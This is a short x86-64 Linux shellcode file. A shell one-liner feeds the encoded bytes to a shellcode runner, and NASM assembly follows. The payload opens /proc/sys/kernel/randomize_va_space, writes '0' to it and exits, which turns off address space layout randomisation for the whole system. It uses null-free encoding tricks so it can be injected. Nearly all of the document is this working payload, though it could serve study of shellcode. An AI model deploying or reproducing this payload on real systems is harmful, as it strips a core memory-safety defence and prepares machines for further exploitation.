
true :; ./sct '\x48\x31\xd2\x48\xbb\xff\xff\xff\xff\xff\x61\x63\x65\x48\xc1\xeb\x28\x53\x48\xbb\x7a\x65\x5f\x76\x61\x5f\x73\x70\x53\x48\xbb\x2f\x72\x61\x6e\x64\x6f\x6d\x69\x53\x48\xbb\x73\x2f\x6b\x65\x72\x6e\x65\x6c\x53\x48\xbb\x2f\x70\x72\x6f\x63\x2f\x73\x79\x53\x48\x89\xe7\x66\xbe\x41\x04\x66\xba\xa4\x01\x48\x31\xc0\xb0\x02\x0f\x05\x48\xbf\xff\xff\xff\xff\xff\xff\xff\x03\x48\xc1\xef\x38\x48\xbb\xff\xff\xff\xff\xff\xff\x30\x0a\x48\xc1\xeb\x30\x53\x48\x89\xe6\x48\xba\xff\xff\xff\xff\xff\xff\xff\x02\x48\xc1\xea\x38\x48\x31\xc0\xb0\x01\x0f\x05\x48\x31\xff\x48\x31\xc0\xb0\x3c\x0f\x05'; exit

bits 64

;/*  open("/proc/sys/kernel/randomize_va_space", O_WRONLY|O_CREAT|O_APPEND, 0644) */

    xor    rdx,rdx
    mov    rbx,0x656361ffffffffff
    shr    rbx,0x28
    push   rbx
    mov    rbx,0x70735f61765f657a
    push   rbx
    mov    rbx,0x696d6f646e61722f
    push   rbx
    mov    rbx,0x6c656e72656b2f73
    push   rbx
    mov    rbx,0x79732f636f72702f
    push   rbx
    mov    rdi,rsp
    mov    si,0x441
    mov    dx,0x1a4
    xor    rax,rax
    mov    al,0x2
    syscall

;/* write(3, "0\n", 2) */

    mov    rdi,0x3ffffffffffffff
    shr    rdi,0x38
    mov    rbx,0xa30ffffffffffff
    shr    rbx,0x30
    push   rbx
    mov    rsi,rsp
    mov    rdx,0x2ffffffffffffff
    shr    rdx,0x38
    xor    rax,rax
    mov    al,0x1
    syscall

;/* _exit(0) */

    xor    rdi,rdi
    xor    rax,rax
    mov    al,0x3c
    syscall
